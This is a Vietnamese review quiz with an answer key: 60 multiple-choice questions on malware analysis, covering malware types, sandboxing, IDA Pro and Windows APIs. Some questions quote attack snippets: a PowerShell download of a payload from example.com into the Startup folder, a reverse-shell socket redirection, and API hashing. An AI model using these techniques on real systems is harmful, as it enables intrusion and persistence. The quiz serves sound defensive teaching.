# 🧪 Bộ câu hỏi ôn tập — Malware Analysis (60 câu)

---

## CHƯƠNG 1 — Giới thiệu về Mã độc

**Câu 1:** Mục tiêu chính của phân tích mã độc là gì?

- [x] A. Xác định điều gì đã xảy ra, tìm máy bị nhiễm và phát triển signature để phát hiện
- [ ] B. Xóa toàn bộ mã độc khỏi hệ thống ngay lập tức
- [ ] C. Reimage lại máy bị nhiễm càng nhanh càng tốt
- [ ] D. Báo cáo sự cố cho cơ quan chức năng

---

**Câu 2:** Host-based signature tập trung vào điều gì?

- [ ] A. Đặc điểm của file mã độc (kích thước, hash)
- [x] B. Hành vi của mã độc trên hệ thống (file tạo ra, thay đổi registry)
- [ ] C. Lưu lượng mạng bất thường
- [ ] D. Chữ ký số của file thực thi

---

**Câu 3:** Tại sao host-based signature hiệu quả hơn antivirus signature với polymorphic malware?

- [ ] A. Vì nó dựa trên hash của file
- [ ] B. Vì nó scan toàn bộ RAM
- [x] C. Vì nó dựa trên hành vi, không phụ thuộc vào hình dạng của mã độc
- [ ] D. Vì nó cập nhật realtime từ cloud

---

**Câu 4:** Theo Verizon DBPR 2015, bao nhiêu % mẫu mã độc là duy nhất với từng tổ chức?

- [ ] A. 30–50%
- [ ] B. 50–70%
- [x] C. 70–90%
- [ ] D. 90–100%

---

**Câu 5:** Loại mã độc nào chỉ tồn tại để tải về mã độc khác?

- [ ] A. Launcher
- [ ] B. Rootkit
- [x] C. Downloader
- [ ] D. RAT

---

**Câu 6:** Điểm khác biệt chính giữa Worm và Virus là gì?

- [ ] A. Worm không gây hại, Virus thì có
- [x] B. Worm tự lây lan qua mạng mà không cần file host, Virus cần gắn vào file khác
- [ ] C. Worm chỉ tấn công Windows, Virus tấn công mọi OS
- [ ] D. Worm mã hóa dữ liệu, Virus thì không

---

**Câu 7:** Rootkit thường đi kèm với loại mã độc nào?

- [ ] A. Adware
- [ ] B. Downloader
- [x] C. Backdoor
- [ ] D. Scareware

---

**Câu 8:** Staged payload khác stageless payload ở điểm nào?

- [x] A. Staged dùng nhiều payload kết hợp, stageless chứa mọi thứ cần thiết trong một payload
- [ ] B. Staged thì nhỏ hơn, stageless thì lớn hơn
- [ ] C. Staged chỉ dùng trên Linux, stageless chỉ dùng trên Windows
- [ ] D. Staged mã hóa traffic, stageless thì không

---

**Câu 9:** Targeted malware (APT) khác mass malware ở điểm nào?

- [ ] A. Targeted malware lây lan nhanh hơn
- [ ] B. Targeted malware rẻ hơn để phát triển
- [x] C. Targeted malware nhắm vào mục tiêu cụ thể, khó phát hiện và gỡ bỏ hơn
- [ ] D. Targeted malware chỉ tấn công qua email

---

**Câu 10:** Packer/Crypter được dùng để làm gì?

- [ ] A. Tăng tốc độ thực thi của mã độc
- [x] B. Nén/mã hóa mã độc để tránh bị antivirus phát hiện
- [ ] C. Tạo ra nhiều biến thể mã độc khác nhau
- [ ] D. Khai thác lỗ hổng trong hệ thống

---

**Câu 11:** Phương pháp phân tích nào phù hợp nhất khi mã độc bị obfuscate nặng?

- [ ] A. Static Analysis thuần túy
- [ ] B. Sandbox tự động
- [x] C. Dynamic Analysis hoặc Hybrid (kết hợp cả hai)
- [ ] D. Chỉ cần dùng strings và VirusTotal

---

**Câu 12:** Nguyên tắc nào SAI khi phân tích mã độc?

- [ ] A. Đừng sa lầy vào chi tiết, tập trung vào tính năng chính
- [ ] B. Linh hoạt thay đổi công cụ khi bị bế tắc
- [x] C. Luôn phân tích toàn bộ từng dòng code trước khi kết luận bất cứ điều gì
- [ ] D. Nhận biết và vượt qua các kỹ thuật chống phân tích của mã độc

---

**Câu 13:** Shellcode là gì?

- [ ] A. Một loại script PowerShell dùng để tải mã độc
- [ ] B. Phần code chịu trách nhiệm mã hóa payload
- [x] C. Tập lệnh được inject và thực thi trong tiến trình bị khai thác
- [ ] D. Đoạn code dùng để bypass UAC

---

**Câu 14:** Công cụ nào thuộc SysInternals Suite?

- [ ] A. IDA Pro, x64dbg, Wireshark
- [x] B. Process Monitor, Process Explorer, Autoruns
- [ ] C. Ghidra, Radare2, OllyDbg
- [ ] D. Volatility, Redline, Mandiant

---

**Câu 15:** LOLBAS là gì?

- [ ] A. Một loại malware framework
- [ ] B. Công cụ phân tích mã độc miễn phí
- [x] C. Các binary/script có sẵn của Windows bị lợi dụng để thực hiện hành vi độc hại
- [ ] D. Kỹ thuật mã hóa payload

---

## CHƯƠNG 2 — Dynamic Analysis & Máy ảo

**Câu 16:** Lý do chính để dùng máy ảo thay vì máy thật khi phân tích mã độc là gì?

- [ ] A. Máy ảo nhanh hơn máy thật
- [x] B. Dễ snapshot/restore và bảo vệ máy host
- [ ] C. Mã độc không thể phát hiện được máy ảo
- [ ] D. Máy ảo có thể chặn mọi kết nối mạng của mã độc

---

**Câu 17:** Chế độ mạng nào nguy hiểm nhất khi phân tích mã độc trong VM?

- [ ] A. Host-only
- [ ] B. NAT
- [ ] C. Isolated (no network)
- [x] D. Bridged

---

**Câu 18:** Mã độc kiểm tra MAC address bắt đầu bằng `00-0C-29` để làm gì?

- [ ] A. Xác định quốc gia của nạn nhân
- [x] B. Phát hiện môi trường VMware
- [ ] C. Tìm địa chỉ gateway mạng
- [ ] D. Kiểm tra kết nối Internet

---

**Câu 19:** Registry key nào mà mã độc thường kiểm tra để phát hiện VMware?

- [x] A. `HKLM\SYSTEM\ControlSet001\Control\Class\{4D36E968...}\DriverDesc`
- [ ] B. `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- [ ] C. `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion`
- [ ] D. `HKLM\SYSTEM\CurrentControlSet\Services\EventLog`

---

**Câu 20:** Sandbox không phù hợp trong trường hợp nào sau đây?

- [ ] A. Phân tích nhanh file EXE đơn giản
- [ ] B. Kiểm tra sơ bộ hành vi mã độc
- [x] C. Mã độc cần tham số dòng lệnh cụ thể để hoạt động
- [ ] D. Tạo báo cáo PDF tổng hợp hành vi

---

**Câu 21:** Tại sao SUNBURST (SolarWinds) sleep 2 tuần trước khi liên lạc C2?

- [ ] A. Để chờ lệnh từ attacker qua email
- [ ] B. Vì cần tải thêm module từ Internet
- [x] C. Để qua được thời gian giám sát của sandbox và các công cụ phân tích
- [ ] D. Vì mã độc cần tích lũy đủ dữ liệu trước khi gửi

---

**Câu 22:** Process Monitor (Procmon) KHÔNG giám sát loại hoạt động nào?

- [ ] A. Registry
- [ ] B. File system
- [ ] C. Network connections
- [x] D. GPU usage

---

**Câu 23:** Trong Process Explorer, màu hồng (pink) đại diện cho loại tiến trình nào?

- [ ] A. Tiến trình mới vừa được tạo
- [x] B. Services
- [ ] C. Tiến trình vừa bị terminate
- [ ] D. Tiến trình đang bị suspend

---

**Câu 24:** Tại sao nút "Verify" trong Properties của Process Explorer không phát hiện được process replacement?

- [ ] A. Vì nó chỉ kiểm tra file trong thư mục System32
- [ ] B. Vì nó không hỗ trợ chữ ký số
- [x] C. Vì nó chỉ verify file trên disk, không verify image đang chạy trong RAM
- [ ] D. Vì chức năng này đã bị vô hiệu hóa trong phiên bản mới

---

**Câu 25:** Regshot hoạt động theo nguyên tắc nào?

- [ ] A. Hook các Registry API để bắt thay đổi realtime
- [x] B. Chụp 2 snapshot registry trước và sau khi chạy mã độc rồi so sánh
- [ ] C. Monitor file hive của registry bằng file system filter
- [ ] D. Dùng ETW (Event Tracing for Windows) để log registry event

---

**Câu 26:** INetSim được dùng để làm gì trong phân tích mã độc?

- [ ] A. Decompile binary sang C code
- [ ] B. Capture packet từ network interface
- [x] C. Giả lập các dịch vụ mạng (HTTP, DNS, FTP...) để mã độc "nghĩ" nó đang online
- [ ] D. Scan port đang mở trên máy bị nhiễm

---

**Câu 27:** Lệnh nào dùng để chạy một DLL có export function tên `Install`?

- [ ] A. `execute rip.dll Install`
- [ ] B. `regsvr32 /i rip.dll`
- [x] C. `rundll32.exe rip.dll,Install`
- [ ] D. `start /dll rip.dll Install`

---

**Câu 28:** Nếu một DLL không có tên export mà chỉ có ordinal, lệnh nào đúng?

- [ ] A. `rundll32.exe xyzzy.dll,Export5`
- [x] B. `rundll32.exe xyzzy.dll,#5`
- [ ] C. `rundll32.exe xyzzy.dll --ordinal 5`
- [ ] D. `rundll32.exe xyzzy.dll /ord:5`

---

**Câu 29:** Khi phân tích mã độc với Procmon, bước nào nên làm TRƯỚC KHI chạy mã độc?

- [ ] A. Mở Wireshark để capture traffic
- [ ] B. Chụp snapshot VM
- [x] C. Set filter theo tên executable và clear toàn bộ event cũ
- [ ] D. Tắt Windows Defender

---

**Câu 30:** Đoạn PowerShell sau đây lưu file vào đâu và với mục đích gì?

```powershell
Invoke-WebRequest -URI https://example.com/payload.bat `
  -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecure.bat"
```

- [ ] A. Lưu vào Desktop để người dùng thấy
- [x] B. Lưu vào Startup folder để tự chạy mỗi khi user đăng nhập — đây là persistence
- [ ] C. Lưu vào System32 để giả làm file hệ thống
- [ ] D. Lưu vào Temp để xóa dấu vết sau khi chạy

---

**Câu 31:** Tham số `-windowstyle hidden` trong PowerShell có tác dụng gì?

- [x] A. Ẩn cửa sổ PowerShell khi thực thi, người dùng không thấy
- [ ] B. Chạy PowerShell với quyền Administrator
- [ ] C. Tắt logging của PowerShell
- [ ] D. Bypass execution policy

---

**Câu 32:** Trong case study mã độc đánh cắp tài khoản MXH, tại sao mã độc mở Chrome đến aliexpress.us?

- [ ] A. Vì aliexpress.us là C2 server
- [ ] B. Để kiểm tra kết nối Internet
- [x] C. Để đánh lạc hướng người dùng trong khi các lệnh độc hại chạy nền
- [ ] D. Để inject code vào trình duyệt

---

**Câu 33:** Loại binary LOLBAS nào thường bị dùng để tải file từ Internet?

- [ ] A. `explorer.exe`
- [ ] B. `msbuild.exe`
- [x] C. `certutil.exe` hoặc `bitsadmin.exe`
- [ ] D. `taskmgr.exe`

---

**Câu 34:** Máy thật air-gapped có nhược điểm nào khi phân tích mã độc?

- [ ] A. Không thể chụp snapshot
- [x] B. Không có Internet nên một số tính năng của mã độc không hoạt động, khó dọn dẹp sau khi nhiễm
- [ ] C. Mã độc không chạy được trên phần cứng thật
- [ ] D. Không thể dùng Wireshark để capture traffic

---

**Câu 35:** SolarWinds SUNBURST được phân loại là loại tấn công nào?

- [ ] A. Ransomware attack
- [ ] B. Phishing campaign
- [x] C. Supply chain attack
- [ ] D. DDoS attack

---

## CHƯƠNG 3 — Static Analysis & IDA Pro

**Câu 36:** Trong Navigation Band của IDA Pro, màu xanh đậm (dark blue) đại diện cho gì?

- [ ] A. Library code — không cần phân tích
- [ ] B. Compiler-generated code
- [x] C. User-written code — cần tập trung phân tích
- [ ] D. Encrypted/packed section

---

**Câu 37:** Trong Graph Mode của IDA Pro, mũi tên màu đỏ có nghĩa là gì?

- [ ] A. Unconditional jump
- [ ] B. Conditional jump được thực hiện (taken)
- [x] C. Conditional jump không được thực hiện (not taken)
- [ ] D. Loop back edge

---

**Câu 38:** Phím tắt nào dùng để xem toàn bộ cross-reference của một function trong IDA Pro?

- [ ] A. Ctrl+F
- [ ] B. Ctrl+G
- [x] C. X hoặc Ctrl+X
- [ ] D. Ctrl+R

---

**Câu 39:** Flag `L` trong cửa sổ Functions của IDA Pro có nghĩa gì?

- [x] A. Library function — thường không cần phân tích sâu
- [ ] B. Large function — cần ưu tiên phân tích
- [ ] C. Locked function — đã được bảo vệ
- [ ] D. Looped function — chứa vòng lặp

---

**Câu 40:** Tại sao nên ưu tiên phân tích các function có kích thước lớn trong IDA Pro?

- [ ] A. Vì chúng thường là library code
- [x] B. Vì function lớn thường chứa logic quan trọng của mã độc
- [ ] C. Vì chúng dễ phân tích hơn function nhỏ
- [ ] D. Vì IDA Pro không thể decompile function nhỏ

---

**Câu 41:** Đọc assembly sau, `test eax, eax` + `jnz` thực hiện logic gì?

```asm
call    OpenMutex
test    eax, eax
jnz     short loc_exit
```

- [ ] A. Nhảy đến `loc_exit` nếu OpenMutex trả về NULL (thất bại)
- [x] B. Nhảy đến `loc_exit` nếu OpenMutex trả về khác NULL (đã tồn tại)
- [ ] C. So sánh eax với giá trị 1 rồi nhảy nếu bằng
- [ ] D. Kiểm tra carry flag và nhảy nếu có lỗi

---

**Câu 42:** Trong IDA Pro, để đổi tên `sub_401000` thành tên có nghĩa, bạn làm gì?

- [ ] A. Double-click vào tên và gõ tên mới
- [ ] B. Right-click → Rename
- [x] C. Click vào tên rồi nhấn phím N
- [ ] D. Edit → Rename function

---

**Câu 43:** Sự khác biệt giữa comment bằng `:` và `;` trong IDA Pro là gì?

- [ ] A. `:` dùng cho code, `;` dùng cho data
- [x] B. `:` chỉ hiện tại chỗ đó, `;` hiện ở tất cả Xref của vị trí đó
- [ ] C. Không có sự khác biệt
- [ ] D. `:` là block comment, `;` là inline comment

---

**Câu 44:** Công cụ nào là open source, hỗ trợ x64 tốt và kế thừa từ OllyDbg?

- [ ] A. IDA Pro
- [ ] B. Radare2
- [x] C. x64dbg
- [ ] D. WinDbg

---

**Câu 45:** FLIRT trong IDA Pro là viết tắt của gì và dùng để làm gì?

- [ ] A. Fast Loading and Immediate Runtime Translation — tăng tốc load binary
- [x] B. Fast Library Identification and Recognition Technology — nhận diện code của thư viện phổ biến
- [ ] C. Function Layout and IR Translation — dịch sang intermediate representation
- [ ] D. File Linking and Import Resolution Tool — giải quyết dynamic import

---

**Câu 46:** Radare2 khác IDA Pro ở điểm quan trọng nào?

- [ ] A. Radare2 chỉ chạy trên Windows
- [ ] B. Radare2 không hỗ trợ debug
- [x] C. Radare2 là open source còn IDA Pro là phần mềm thương mại
- [ ] D. Radare2 không có tính năng cross-reference

---

**Câu 47:** Khi phân tích static, bạn thấy import table của một binary chứa `GetAsyncKeyState`, `SetWindowsHookEx`, `OpenClipboard`. Đây có khả năng là loại mã độc gì?

- [ ] A. Ransomware
- [ ] B. Downloader
- [x] C. Keylogger / Spyware
- [ ] D. Rootkit

---

**Câu 48:** Xrefs to (trong Graphing Options của IDA Pro) cho biết điều gì?

- [x] A. Tất cả các đường đi dẫn đến function được chọn (ai gọi function này)
- [ ] B. Tất cả các function mà function được chọn gọi đến
- [ ] C. Danh sách tất cả string được dùng trong function
- [ ] D. Danh sách tất cả biến local trong function

---

## CHƯƠNG 4 — Windows Internals & API

**Câu 49:** Hungarian Notation `dwSize` cho biết biến này có kiểu dữ liệu gì?

- [ ] A. WORD — 16-bit unsigned integer
- [x] B. DWORD — 32-bit unsigned integer
- [ ] C. HANDLE — tham chiếu đến object
- [ ] D. LPSTR — con trỏ đến chuỗi ASCII

---

**Câu 50:** Handle khác pointer ở điểm nào?

- [ ] A. Handle luôn là con trỏ 64-bit, pointer có thể là 32 hoặc 64-bit
- [x] B. Handle không thể dùng trong phép tính số học, không nhất thiết là địa chỉ bộ nhớ thực
- [ ] C. Handle chỉ dùng cho file, pointer dùng cho mọi thứ
- [ ] D. Handle được giải phóng tự động, pointer thì không

---

**Câu 51:** Tại sao malware thích dùng `CreateFileMapping` + `MapViewOfFile` hơn `ReadFile` thông thường?

- [ ] A. Vì `ReadFile` bị Windows Defender chặn
- [x] B. Vì file mapping cho phép parse và thao tác PE header trong memory, có thể thực thi file mà không qua Windows loader
- [ ] C. Vì `ReadFile` chỉ đọc được file nhỏ hơn 4MB
- [ ] D. Vì file mapping nhanh hơn 10 lần so với ReadFile

---

**Câu 52:** Alternate Data Stream (ADS) là gì?

- [ ] A. Luồng dữ liệu mạng thứ hai trong kết nối TCP
- [x] B. Stream dữ liệu thứ hai gắn vào một file, không hiển thị trong Explorer thông thường
- [ ] C. Phân vùng ẩn trên ổ cứng
- [ ] D. Loại registry value đặc biệt để lưu binary data

---

**Câu 53:** Run Key ở `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` khác `HKLM\...\Run` như thế nào?

- [x] A. HKCU chỉ áp dụng cho user hiện tại, HKLM áp dụng cho tất cả user trên máy
- [ ] B. HKCU chạy trước HKLM khi khởi động
- [ ] C. HKCU cần quyền Admin để ghi, HKLM thì không
- [ ] D. HKLM đã bị deprecated từ Windows 10

---

**Câu 54:** Đọc code sau, malware đang thực hiện kỹ thuật gì?

```c
HANDLE h = OpenMutex(MUTEX_ALL_ACCESS, FALSE, "HGL345");
if (h != NULL) {
    ExitProcess(0);
}
CreateMutex(NULL, FALSE, "HGL345");
```

- [ ] A. Privilege escalation
- [ ] B. Process injection
- [x] C. Kiểm tra single instance — đảm bảo chỉ có một bản mã độc chạy
- [ ] D. Anti-debugging

---

**Câu 55:** Đọc code tạo reverse shell sau, tại sao `hStdInput`, `hStdOutput`, `hStdError` được set thành socket handle?

```c
si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
CreateProcess(NULL, "cmd.exe", ..., TRUE, 0, ..., &si, &pi);
```

- [ ] A. Để cmd.exe nhận được địa chỉ IP của attacker
- [x] B. Để stdin/stdout/stderr của cmd.exe được redirect qua socket — attacker có thể gõ lệnh và nhận kết quả từ xa
- [ ] C. Để bypass UAC khi tạo process mới
- [ ] D. Để cmd.exe chạy với quyền SYSTEM

---

**Câu 56:** Service chạy dưới dạng `WIN32_SHARE_PROCESS` thường ẩn trong tiến trình nào?

- [ ] A. `explorer.exe`
- [ ] B. `lsass.exe`
- [x] C. `svchost.exe`
- [ ] D. `services.exe`

---

**Câu 57:** Tại sao malware thích đăng ký thành Windows Service để persistence?

- [ ] A. Vì Service không bị Windows Defender scan
- [ ] B. Vì Service không cần file trên disk
- [x] C. Vì Service tự động chạy khi Windows khởi động và thường chạy với quyền SYSTEM
- [ ] D. Vì Service không hiển thị trong Task Manager

---

**Câu 58:** Native API (ntdll.dll) được malware ưa dùng vì lý do nào?

- [ ] A. Nó nhanh hơn Windows API thông thường 100 lần
- [ ] B. Nó có tài liệu đầy đủ và dễ sử dụng
- [x] C. Nó undocumented, cấp thấp hơn, khó bị hook/detect hơn Windows API thông thường
- [ ] D. Nó cho phép malware chạy mà không cần quyền Admin

---

**Câu 59:** Direct SYSCALL giúp malware bypass được gì?

- [ ] A. Windows Firewall
- [ ] B. UAC (User Account Control)
- [x] C. Các hook mà AV/EDR đặt trong ntdll.dll để giám sát API call
- [ ] D. ASLR (Address Space Layout Randomization)

---

**Câu 60:** API Hashing trong malware hoạt động thế nào?

```c
FARPROC fn = resolveByHash(0xEC0E4E8E); // thay vì gọi LoadLibraryA trực tiếp
```

- [ ] A. Mã hóa toàn bộ import table bằng AES
- [ ] B. Thay thế tên API bằng địa chỉ bộ nhớ hardcoded
- [x] C. Tính hash của tên API lúc runtime để tìm hàm, tránh để lộ tên API trong import table
- [ ] D. Dùng COM để gọi API mà không cần import

---
